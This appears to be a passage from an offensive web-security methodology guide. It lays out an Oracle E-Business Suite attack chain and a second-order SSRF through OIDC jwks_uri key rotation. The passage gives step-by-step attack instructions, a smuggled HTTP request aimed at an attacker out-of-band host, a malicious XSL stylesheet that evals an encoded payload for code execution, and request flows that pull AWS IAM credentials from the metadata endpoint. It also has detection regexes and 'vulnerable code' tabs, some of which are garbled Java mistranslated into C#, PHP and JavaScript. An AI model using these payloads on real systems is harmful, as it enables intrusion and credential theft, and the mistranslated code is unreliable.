+Identify the internal services of the application and check what types of addresses are listening inside the application (for example, different ports or specific IP addresses)
+
+```bash
+# netstat -lnt
+
+tcp6       0      0 172.31.28.161:7201      :::*                    LISTEN
+```
+{% endstep %}
+
+{% step %}
+Review operating system configuration files such as `/etc/hosts` to determine which domain is mapped to that IP address
+
+```bash
+# cat /etc/hosts
+
+172.31.28.161   apps.example.com        apps
+```
+{% endstep %}
+
+{% step %}
+Identify internal paths and endpoints of the application, especially JSP files, Servlets, APIs, and administrative pages, and send a request to them
+
+```bash
+# curl -s http://apps.example.com:7201/OA_HTML/ieshostedsurvey.jsp
+
+Requested resource or page is not allowed in this site
+```
+{% endstep %}
+
+{% step %}
+If access is denied, try to bypass it using path traversal, and if successful, the whitelist bypass has been successfully achieved
+
+```bash
+# curl -s --path-as-is http://apps.example.com:7201/OA_HTML/help/../ieshostedsurvey.jsp
+
+<!-- $Header: ieshostedsurvey.jsp 120.0 2005/06/03 07:43:36 appldev noship $ -->
+<!-- +======================================================================+ -->
+<!-- |    Copyright (c) 2005, 2017 Oracle and/or its affiliates.           | -->
+<!-- |                         All rights reserved.                         | -->
+<!-- |                           Version 12.0.0                             | -->
+<!-- +======================================================================+ -->
+
+<html>
+<head>
+```
+{% endstep %}
+
+{% step %}
+Then, in these JSP files, look for the use of transformation and processing engines such as XSLT, `XSLProcessor`, `TransformerFactory`, `SAXTransformerFactory`, `XSLStylesheet`, and similar APIs
+
+**VSCode (Regex Detection)**
+
+{% tabs %}
+{% tab title="C#" %}
+```regex
+(XslCompiledTransform)|(XmlUrlResolver)|(Load\s*\(\s*.*http)|(Transform\s*\()
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regex
+(new\s+URL\s*\()|(XSLStylesheet\s*\()|(XSLProcessor\s*\()|(processXSL\s*\()|(urlbuf|toString\s*\(\))
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regex
+(XSLTProcessor)|(load\s*\(\s*.*http)|(DOMDocument)|(loadXML)
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regex
+(xslt-process|libxslt|fetch\s*\(|axios\.get|xml2js)
+```
+{% endtab %}
+{% endtabs %}
+
+**RipGrep (Regex Detection(Linux))**
+
+{% tabs %}
+{% tab title="C#" %}
+```regex
+XslCompiledTransform|XmlUrlResolver|Load\s*\(\s*.*http|Transform\s*\(
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regex
+new\s+URL\s*\(|XSLStylesheet\s*\(|XSLProcessor\s*\(|processXSL\s*\(|urlbuf|toString\s*\(
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regex
+XSLTProcessor|load\s*\(\s*.*http|DOMDocument|loadXML
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regex
+xslt-process|libxslt|fetch\s*\(|axios\.get|xml2js
+```
+{% endtab %}
+{% endtabs %}
+
+**Vulnerable Code Patterns**
+
+{% tabs %}
+{% tab title="C#" %}
+```csharp
+string xslURL = urlbuf.toString() + "ieshostedsurvey.xsl"; // [5]
+
+String desturl = ServletSessionManager.getURL("iessvymenubased.jsp");
+StringBuffer query = new StringBuffer("select s.survey_name || '--> ' || c.SURVEY_CYCLE_NAME || '--> ' || d.Deployment_name || '--> ' ||d.SURVEY_DEPLOYMENT_ID as survey_name,");
+
+query.append("\'").append(desturl).append("\'").append(" uri ,d.SURVEY_DEPLOYMENT_ID as deployment_id " +
+     " from  IES_SVY_SURVEYS_ALL s, " +
+             "       IES_SVY_CYCLES_ALL c, " +
+             "       IES_SVY_DEPLYMENTS_ALL d " +
+             " where " +
+             "      s.SURVEY_ID = c.SURVEY_ID " +
+             "      and c.SURVEY_CYCLE_ID = d.SURVEY_CYCLE_ID " +
+             "      and d.DEPLOYMENT_STATUS_CODE = 'ACTIVE' " +
+             "      and d.LIST_HEADER_ID is null " +
+             "      and sysdate between d.DEPLOY_DATE and d.RESPONSE_END_DATE ");
+
+Connection conn = null;
+OracleXMLQuery q = null;
+try{
+    conn = TransactionScope.getConnection();
+    q = new OracleXMLQuery(conn, query.toString());
+}catch(Exception ex){
+    out.println(ex.getMessage());
+    if(conn != null)
+        conn.close();
+}
+
+XMLDocument xmlDoc = (XMLDocument)q.getXMLDOM();
+
+//URL stylesheetURL = new URL("http://kpandey-lap1.us.oracle.com/html/ieshostedsurvey.xsl");
+URL stylesheetURL = new URL(xslURL.toString()); // [6]
+XSLStylesheet sheet = new XSLStylesheet(stylesheetURL, stylesheetURL); // [7]
+XSLProcessor xslt = new XSLProcessor(); // [8]
+
+ByteArrayOutputStream outBytes = new ByteArrayOutputStream();
+
+xslt.processXSL(
+    sheet,
+    xmlDoc,
+    new PrintWriter(
+        new BufferedWriter(
+            new OutputStreamWriter(outBytes)
+        )
+    )
+); // [9]
+
+String html = outBytes.toString();
+out.println(html);
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+String xslURL = urlbuf.toString() + "ieshostedsurvey.xsl"; // [5]
+
+String desturl = ServletSessionManager.getURL("iessvymenubased.jsp");
+StringBuffer query = new StringBuffer("select s.survey_name || '--> ' || c.SURVEY_CYCLE_NAME || '--> ' || d.Deployment_name || '--> ' ||d.SURVEY_DEPLOYMENT_ID as survey_name,");
+
+query.append("\'").append(desturl).append("\'").append(" uri ,d.SURVEY_DEPLOYMENT_ID as deployment_id " +
+     " from  IES_SVY_SURVEYS_ALL s, " +
+             "       IES_SVY_CYCLES_ALL c, " +
+             "       IES_SVY_DEPLYMENTS_ALL d " +
+             " where " +
+             "      s.SURVEY_ID = c.SURVEY_ID " +
+             "      and c.SURVEY_CYCLE_ID = d.SURVEY_CYCLE_ID " +
+             "      and d.DEPLOYMENT_STATUS_CODE = 'ACTIVE' " +
+             "      and d.LIST_HEADER_ID is null " +
+             "      and sysdate between d.DEPLOY_DATE and d.RESPONSE_END_DATE ");
+
+Connection conn = null;
+OracleXMLQuery q = null;
+try{
+    conn = TransactionScope.getConnection();
+    q = new OracleXMLQuery(conn, query.toString());
+}catch(Exception ex){
+    out.println(ex.getMessage());
+    if(conn != null)
+        conn.close();
+}
+
+XMLDocument xmlDoc = (XMLDocument)q.getXMLDOM();
+
+//URL stylesheetURL = new URL("http://kpandey-lap1.us.oracle.com/html/ieshostedsurvey.xsl");
+URL stylesheetURL = new URL(xslURL.toString()); // [6]
+XSLStylesheet sheet = new XSLStylesheet(stylesheetURL, stylesheetURL); // [7]
+XSLProcessor xslt = new XSLProcessor(); // [8]
+
+ByteArrayOutputStream outBytes = new ByteArrayOutputStream();
+
+xslt.processXSL(
+    sheet,
+    xmlDoc,
+    new PrintWriter(
+        new BufferedWriter(
+            new OutputStreamWriter(outBytes)
+        )
+    )
+); // [9]
+
+String html = outBytes.toString();
+out.println(html);
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+$xslURL = $urlbuf->toString() . "ieshostedsurvey.xsl"; // [5]
+
+$desturl = ServletSessionManager::getURL("iessvymenubased.jsp");
+$query = new StringBuffer("select s.survey_name || '--> ' || c.SURVEY_CYCLE_NAME || '--> ' || d.Deployment_name || '--> ' ||d.SURVEY_DEPLOYMENT_ID as survey_name,");
+
+$query->append("\'")->append($desturl)->append("\'")->append(" uri ,d.SURVEY_DEPLOYMENT_ID as deployment_id " .
+     " from  IES_SVY_SURVEYS_ALL s, " .
+             "       IES_SVY_CYCLES_ALL c, " .
+             "       IES_SVY_DEPLYMENTS_ALL d " .
+             " where " .
+             "      s.SURVEY_ID = c.SURVEY_ID " .
+             "      and c.SURVEY_CYCLE_ID = d.SURVEY_CYCLE_ID " .
+             "      and d.DEPLOYMENT_STATUS_CODE = 'ACTIVE' " .
+             "      and d.LIST_HEADER_ID is null " .
+             "      and sysdate between d.DEPLOY_DATE and d.RESPONSE_END_DATE ");
+
+$conn = null;
+$q = null;
+try{
+    $conn = TransactionScope::getConnection();
+    $q = new OracleXMLQuery($conn, $query->toString());
+}catch(Exception $ex){
+    out.println($ex->getMessage());
+    if($conn != null)
+        $conn->close();
+}
+
+$xmlDoc = (XMLDocument)$q->getXMLDOM();
+
+//URL stylesheetURL = new URL("http://kpandey-lap1.us.oracle.com/html/ieshostedsurvey.xsl");
+$stylesheetURL = new URL($xslURL->toString()); // [6]
+$sheet = new XSLStylesheet($stylesheetURL, $stylesheetURL); // [7]
+$xslt = new XSLProcessor(); // [8]
+
+$outBytes = new ByteArrayOutputStream();
+
+$xslt->processXSL(
+    $sheet,
+    $xmlDoc,
+    new PrintWriter(
+        new BufferedWriter(
+            new OutputStreamWriter($outBytes)
+        )
+    )
+); // [9]
+
+$html = $outBytes->toString();
+out.println($html);
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```javascript
+let xslURL = urlbuf.toString() + "ieshostedsurvey.xsl"; // [5]
+
+let desturl = ServletSessionManager.getURL("iessvymenubased.jsp");
+let query = new StringBuffer("select s.survey_name || '--> ' || c.SURVEY_CYCLE_NAME || '--> ' || d.Deployment_name || '--> ' ||d.SURVEY_DEPLOYMENT_ID as survey_name,");
+
+query.append("\'").append(desturl).append("\'").append(" uri ,d.SURVEY_DEPLOYMENT_ID as deployment_id " +
+     " from  IES_SVY_SURVEYS_ALL s, " +
+             "       IES_SVY_CYCLES_ALL c, " +
+             "       IES_SVY_DEPLYMENTS_ALL d " +
+             " where " +
+             "      s.SURVEY_ID = c.SURVEY_ID " +
+             "      and c.SURVEY_CYCLE_ID = d.SURVEY_CYCLE_ID " +
+             "      and d.DEPLOYMENT_STATUS_CODE = 'ACTIVE' " +
+             "      and d.LIST_HEADER_ID is null " +
+             "      and sysdate between d.DEPLOY_DATE and d.RESPONSE_END_DATE ");
+
+let conn = null;
+let q = null;
+try{
+    conn = TransactionScope.getConnection();
+    q = new OracleXMLQuery(conn, query.toString());
+}catch(Exception ex){
+    out.println(ex.getMessage());
+    if(conn != null)
+        conn.close();
+}
+
+let xmlDoc = (XMLDocument)q.getXMLDOM();
+
+//URL stylesheetURL = new URL("http://kpandey-lap1.us.oracle.com/html/ieshostedsurvey.xsl");
+let stylesheetURL = new URL(xslURL.toString()); // [6]
+let sheet = new XSLStylesheet(stylesheetURL, stylesheetURL); // [7]
+let xslt = new XSLProcessor(); // [8]
+
+let outBytes = new ByteArrayOutputStream();
+
+xslt.processXSL(
+    sheet,
+    xmlDoc,
+    new PrintWriter(
+        new BufferedWriter(
+            new OutputStreamWriter(outBytes)
+        )
+    )
+); // [9]
+
+let html = outBytes.toString();
+out.println(html);
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Check whether this URL is built from user-controllable data such as the `Host` header, `GET/POST` parameters, cookies, custom headers, or session variables. Then create a malicious XSL file that uses available extension functions to execute code or commands, host the XSL file on an HTTP server under your control, craft a request that forces the application to download and process the XSL file from your server, and then confirm that the XSL file was downloaded and processed
+
+Request :
+
+```http
+POST /OA_HTML/configurator/UiServlet HTTP/1.1
+Host: not-actually-watchtowr.com-stop-emailing-us-about-iocs:8000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+CSRF-XHR: YES
+FETCH-CSRF-TOKEN: 1
+Cookie: JSESSIONID=_NG5Yg8cBERFjA5L23s9UUyzG7G8hSZpYkmc6YAEBjT71alQ2UH6!906988146; EBSDB=oSVgJCh0YacxUZCwOlLajtL2zo
+Content-Length: 847
+Content-Type: application/x-www-form-urlencoded
+
+redirectFromJsp=1&getUiType=<@urlencode><?xml version="1.0" encoding="UTF-8"?>
+<initialize>
+    <param name="init_was_saved">test</param>
+    <param name="return_url"><http://apps.example.com:7201><@html_entities>/OA_HTML/help/../ieshostedsurvey.jsp HTTP/1.2
+Host: attacker-oob-server
+User-Agent: anything
+Connection: keep-alive
+Cookie: JSESSIONID=_NG5Yg8cBERFjA5L23s9UUyzG7G8hSZpYkmc6YAEBjT71alQ2UH6!906988146; EBSDB=oSVgJCh0YacxUZCwOlLajtL2zo
+ 
+
+POST /</@html_entities></param>
+ 
+    <param name="ui_def_id">0</param>
+    <param name="config_effective_usage_id">0</param>
+    <param name="ui_type">Applet</param>
+</initialize></@urlencode>
+```
+
+XSL Content File :
+
+```xsl
+<xsl:stylesheet version="1.0"
+                    xmlns:xsl="<http://www.w3.org/1999/XSL/Transform>"
+                    xmlns:b64="<http://www.oracle.com/XSL/Transform/java/sun.misc.BASE64Decoder>"
+                    xmlns:jsm="<http://www.oracle.com/XSL/Transform/java/javax.script.ScriptEngineManager>"
+                    xmlns:eng="<http://www.oracle.com/XSL/Transform/java/javax.script.ScriptEngine>"
+                    xmlns:str="<http://www.oracle.com/XSL/Transform/java/java.lang.String>">
+        <xsl:template match="/">
+            <xsl:variable name="bs" select="b64:decodeBuffer(b64:new(),'[base64_encoded_payload]')"/>
+            <xsl:variable name="js" select="str:new($bs)"/>
+            <xsl:variable name="m" select="jsm:new()"/>
+            <xsl:variable name="e" select="jsm:getEngineByName($m, 'js')"/>
+            <xsl:variable name="code" select="eng:eval($e, $js)"/>
+            <xsl:value-of select="$code"/>
+        </xsl:template>
+    </xsl:stylesheet>
+```
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### Second-Order SSRF via Asynchronous OIDC Discovery (JWKS URI) Key Rotation Pipelines
+
+{% stepper %}
+{% step %}
+Map the entire target system using Burp Suite. Focus on hyper-scale B2B platforms offering "Bring-Your-Own-Identity" (BYO-IdP) features via OAuth2, OpenID Connect (OIDC), or SAML
+{% endstep %}
+
+{% step %}
+Draw the application's architecture and trust boundaries inside XMind
+{% endstep %}
+
+{% step %}
+Decompile or reverse engineer the application according to the underlying technology stack
+{% endstep %}
+
+{% step %}
+Identify the "Zero-Trust Identity Federation" architecture. During onboarding, Tenant Administrators provide an `Issuer URL` (e.g., `[https://idp.attacker.com](https://idp.attacker.com)`)
+{% endstep %}
+
+{% step %}
+Investigate the OIDC Auto-Discovery optimization. To avoid manually configuring cryptographic signing keys, the backend platform automatically appends `/.well-known/openid-configuration` to the provided Issuer URL to fetch the Identity Provider's metadata
+{% endstep %}
+
+{% step %}
+Analyze the perimeter SSRF defenses. The application rigorously validates the provided `Issuer URL`. It resolves the domain, ensures it points to a public IP address, and verifies it operates over `HTTPS`. Only then does it fetch the configuration
+{% endstep %}
+
+{% step %}
+Discover the architectural delegation of trust: The OIDC configuration is a JSON document containing a critical property: `"jwks_uri"`. This URI dictates where the platform should download the cryptographic public keys (JSON Web Key Set)
+{% endstep %}
+
+{% step %}
+Observe the latent vulnerability: Developers explicitly assume that if the primary `Issuer URL` passes the strict SSRF filter, the resulting metadata (the URLs contained _within_ the discovery document) is inherently secure and authoritative. They fail to apply the SSRF validation algorithm to the extracted `jwks_uri`
+{% endstep %}
+
+{% step %}
+Investigate the "Key Rotation" background worker. Cryptographic keys expire. To prevent authentication downtime, an asynchronous background microservice periodically awakens (e.g., every 60 minutes) to poll the cached `jwks_uri` and update the active keys
+{% endstep %}
+
+{% step %}
+Understand the execution context: Because this background worker processes non-user-facing system tasks, it often resides deep within the internal Kubernetes cluster, entirely bypassing the stringent external API Gateway firewalls and ingress SSRF restrictions
+{% endstep %}
+
+{% step %}
+Formulate the Asynchronous SSRF payload. Setup a legitimate, external OIDC provider. Register its `Issuer URL` in the target platform to successfully bypass the initial onboarding SSRF filters
+{% endstep %}
+
+{% step %}
+Once the platform has cached your configuration, maliciously modify your external OIDC server's `.well-known/openid-configuration` file. Change the `jwks_uri` to point to a highly classified internal endpoint (`[http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/)` or `[http://internal-kube-api.svc.cluster.local:8080/secrets](http://internal-kube-api.svc.cluster.local:8080/secrets)`)
+{% endstep %}
+
+{% step %}
+Wait for the background key-rotation worker to trigger its polling cycle
+{% endstep %}
+
+{% step %}
+The internal worker retrieves the poisoned `jwks_uri` from the cache and blindly executes an HTTP GET request directly against the internal network endpoint
+{% endstep %}
+
+{% step %}
+The internal endpoint returns non-JWKS data (e.g., AWS STS credentials). The worker's strict JSON parser fails to map the response to an array of cryptographic keys. The global exception handler catches the parsing error and logs the _raw HTTP response body_ to the centralized Tenant Observability Dashboard ("Key Rotation Failure: ..."). The attacker accesses their tenant logs, exfiltrating the internal cloud credentials
+
+**VSCode Regex Detection**
+
+{% tabs %}
+{% tab title="C#" %}
+```regexp
+\b(?:var\s+jwksUri\s*=\s*(?:oidcConfig\.JwksUri|.*jwks_uri)[\s\S]{0,120}?httpClient\.GetAsync\s*\(\s*jwksUri\s*\)|oidcConfig\.JwksUri[\s\S]{0,150}?(?:HttpClient|WebClient|GetAsync|SendAsync)|jwks_uri[\s\S]{0,150}?GetAsync)
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regexp
+\b(?:String\s+jwksUri\s*=\s*configNode\.get\s*\(\s*"jwks_uri"\s*\)[\s\S]{0,120}?restTemplate\.getForObject|jwks_uri[\s\S]{0,150}?(?:RestTemplate|WebClient|HttpClient|execute)|getForObject\s*\(\s*jwksUri)
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regexp
+\b(?:\$jwksUri\s*=\s*\$oidcConfig\[['"]jwks_uri['"]\][\s\S]{0,120}?Http::get\s*\(\s*\$jwksUri\s*\)|jwks_uri[\s\S]{0,150}?(?:Http::get|curl_exec|file_get_contents)|\$jwksUri[\s\S]{0,100}?curl)
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regexp
+\b(?:nunjucks\.compile\s*\([\s\S]{0,100}?(?:customWebhookBody|payload|template)|nunjucks\.renderString\s*\([\s\S]{0,120}?(?:payload|template)|Handlebars\.compile\s*\([\s\S]{0,120}?(?:payload|template)|ejs\.compile\s*\([\s\S]{0,120}?(?:payload|template))\b(?:const\s+jwksUri\s*=\s*oidcConfig\.jwks_uri[\s\S]{0,120}?fetch\s*\(\s*jwksUri\s*\)|jwks_uri[\s\S]{0,150}?(?:fetch|axios\.get|https\.get|request)|const\s+\w*jwks\w*\s*=\s*await\s+fetch)
+```
+{% endtab %}
+{% endtabs %}
+
+**RipGrep Regex Detection**
+
+{% tabs %}
+{% tab title="C#" %}
+```regexp
+var\s+jwksUri\s*=\s*oidcConfig\.JwksUri.*httpClient\.GetAsync|oidcConfig\.JwksUri.*GetAsync|jwks_uri.*GetAsync
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regexp
+String\s+jwksUri\s*=\s*configNode\.get\("jwks_uri"\).*restTemplate\.getForObject|jwks_uri.*restTemplate|getForObject\(.*jwksUri
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regexp
+\$twig->createTemplate\(\$customPayload\)|createTemplate\(.*\$payload|Blade::compileString\(.*payload\$jwksUri\s*=\s*\$oidcConfig\['jwks_uri'\].*Http::get\(\$jwksUri\)|jwks_uri.*Http::get|jwksUri.*curl
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regexp
+const\s+jwksUri\s*=\s*oidcConfig\.jwks_uri.*fetch\(jwksUri\)|jwks_uri.*fetch|jwksUri.*axios
+```
+{% endtab %}
+{% endtabs %}
+
+**Vulnerable Code Pattern**
+
+{% tabs %}
+{% tab title="C#" %}
+```csharp
+public class JwksRotationWorker : BackgroundService
+{
+    private readonly HttpClient _internalClient;
+    private readonly ILogger<JwksRotationWorker> _logger;
+
+    public async Task RotateKeysAsync(TenantIdpConfig config) 
+    {
+        try 
+        {
+            // [1]
+            // [2]
+            var jwksUri = config.CachedOidcMetadata.JwksUri;
+
+            // [3]
+            // [4]
+            var response = await _internalClient.GetAsync(jwksUri);
+            response.EnsureSuccessStatusCode();
+
+            var rawJwks = await response.Content.ReadAsStringAsync();
+            var keys = JsonConvert.DeserializeObject<JsonWebKeySet>(rawJwks);
+            
+            await _keyStore.UpdateKeysAsync(config.TenantId, keys);
+        }
+        catch (JsonReaderException ex) 
+        {
+            // Fatal logging error: echoes the unparsed internal response to tenant diagnostic logs
+            _logger.LogError("Tenant {TenantId} JWKS parsing failed. Raw Response: {RawResponse}", config.TenantId, ex.Message);
+        }
+    }
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+@Component
+public class JwksRotationWorker {
+
+    @Autowired
+    private RestTemplate internalClient;
+    @Autowired
+    private TenantLogService tenantLogger;
+
+    @Scheduled(fixedRate = 3600000)
+    public void rotateKeys(TenantIdpConfig config) {
+        try {
+            // [1]
+            // [2]
+            String jwksUri = config.getCachedOidcMetadata().getJwksUri();
+
+            // [3]
+            // [4]
+            ResponseEntity<String> response = internalClient.getForEntity(jwksUri, String.class);
+            
+            ObjectMapper mapper = new ObjectMapper();
+            JsonWebKeySet keys = mapper.readValue(response.getBody(), JsonWebKeySet.class);
+            
+            keyStore.updateKeys(config.getTenantId(), keys);
+
+        } catch (JsonProcessingException ex) {
+            // Exfiltrates the internal response to the tenant's visible error dashboard
+            tenantLogger.logError(config.getTenantId(), "JWKS Update Failed. Invalid schema received: " + ex.getOriginalMessage());
+        }
+    }
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+class JwksRotationWorker implements ShouldQueue
+{
+    protected $tenantLogger;
+
+    public function handle(TenantIdpConfig $config): void 
+    {
+        try {
+            // [1]
+            // [2]
+            $jwksUri = $config->cachedOidcMetadata['jwks_uri'];
+
+            // [3]
+            // [4]
+            $response = Http::get($jwksUri);
+            
+            $keys = json_decode($response->body(), true, 512, JSON_THROW_ON_ERROR);
+            
+            $this->keyStore->updateKeys($config->tenantId, $keys);
+
+        } catch (\JsonException $ex) {
+            // Logs the raw internal endpoint output
+            $this->tenantLogger->error($config->tenantId, "Failed to parse JWKS. Received: " . $response->body());
+        }
+    }
+}
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```javascript
+class JwksRotationWorker {
+    static async rotateKeys(config) {
+        let rawResponse = "";
+        try {
+            // [1]
+            // [2]
+            let jwksUri = config.cachedOidcMetadata.jwks_uri;
+
+            // [3]
+            // [4]
+            let response = await fetch(jwksUri);
+            rawResponse = await response.text();
+            
+            let keys = JSON.parse(rawResponse);
+            
+            await keyStore.updateKeys(config.tenantId, keys);
+
+        } catch (err) {
+            // Flushes the exfiltrated internal data to the UI diagnostics portal
+            await tenantLogger.logError(config.tenantId, `JWKS Rotation Failed. Content: ${rawResponse}`);
+        }
+    }
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+\[1] The system supports dynamic Identity Federation by caching the external Identity Provider's OIDC configuration metadata during the initial, strictly validated onboarding phase, \[2] The backend trusts the cached configuration implicitly, operating under the assumption that if the parent `Issuer URL` was safe, its child endpoints (`jwks_uri`) are cryptographically bound to the same safe domain, \[3] To support seamless key rotation, a background worker runs asynchronously. This worker utilizes a generic, un-sandboxed internal HTTP client, entirely bypassing the edge-layer SSRF mitigation logic (which only inspects user-facing API calls), \[4] The execution sink. The background worker blindly executes a `GET` request against the attacker's poisoned URI, successfully hitting internal infrastructure. Because the internal endpoint (e.g., AWS Metadata) returns plaintext instead of a structured JWKS array, the JSON parser throws an exception. The exception handler inadvertently acts as the exfiltration mechanism, writing the classified internal response into a diagnostic log accessible to the Tenant Administrator
+
+```http
+// 1. Attacker (Tenant Admin) onboards a custom IdP using a valid, external domain to bypass the SSRF filter.
+POST /api/v1/sso/configure HTTP/1.1
+Host: api.enterprise.tld
+Authorization: Bearer <tenant_token>
+
+{"issuerUrl": "https://idp.attacker.com/"}
+
+// 2. The Enterprise Backend validates idp.attacker.com (Public IP, valid TLS).
+// 3. The Backend fetches https://idp.attacker.com/.well-known/openid-configuration and caches it.
+// 4. The Attacker updates their external server's openid-configuration file:
+// { "jwks_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/production-role" }
+
+// 5. The asynchronous JwksRotationWorker triggers. It reads the updated jwks_uri and fetches it.
+// 6. The worker's HTTP client bypasses ingress filters, hitting the AWS IMDSv1 endpoint.
+// 7. The worker attempts to JSON.parse the AWS STS credentials, fails, and logs the response.
+
+// 8. The Attacker queries their Tenant Diagnostic Logs:
+GET /api/v1/tenant/diagnostics/logs HTTP/1.1
+Host: api.enterprise.tld
+Authorization: Bearer <tenant_token>
+
+// 9. The API returns the exfiltrated Cloud IAM credentials.
+HTTP/1.1 200 OK
+{
+  "logs": [
+    "[ERROR] JWKS Rotation Failed. Content: {\"Code\":\"Success\",\"AccessKeyId\":\"ASIA...\",\"SecretAccessKey\":\"...\"}"
+  ]
+}
+```
+{% endstep %}
+
+{% step %}
+To deliver seamless Multi-Tenant Single Sign-On without manual cryptographic key management, platform engineers implemented OIDC Auto-Discovery. The security perimeter relied on rigorous validation of the user-provided `Issuer URL` at the moment of ingress. However, they failed to recognize that OIDC discovery represents a transitive trust boundary. By implicitly trusting the `jwks_uri` returned within the third-party configuration payload, the architecture deferred network routing authority to an external actor. The attacker exploited this by modifying their external metadata after the initial validation phase, injecting a highly classified internal cloud IP. The vulnerability incubated until the asynchronous key-rotation worker awoke. Operating deep inside the trusted internal mesh and bypassing edge SSRF filters, the worker executed the internal request. The resulting parsing failure inadvertently weaponized the application's own error handling mechanisms, exfiltrating the internal cloud orchestration secrets directly to the attacker's diagnostic dashboard
+{% endstep %}
+{% endstepper %}
+
+***
+
+## Cheat Sheet
